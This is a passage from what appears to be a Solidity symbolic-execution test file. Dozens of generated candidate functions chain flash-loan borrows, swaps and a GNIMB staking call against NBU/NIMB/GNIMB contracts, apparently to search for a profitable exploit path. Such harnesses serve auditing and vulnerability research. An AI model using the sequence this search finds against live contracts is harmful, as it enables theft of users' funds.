        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
